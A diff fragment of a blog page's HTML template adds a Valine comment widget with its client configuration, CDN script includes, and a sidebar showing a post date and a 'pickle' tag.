+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"cpZORvFIFYBpXIpB2keghfF5-gzGzoHsz","appKey":"AaIROzg1ne0ieJFAT5xbC9WY","placeholder":"","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"],"pageView":"ture"}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
 
 	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
 	
-</div> <!-- row-fluid -->
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-03-29 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/pickle/">pickle<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
 	</div>
   </div>
   <div class="container-narrow">
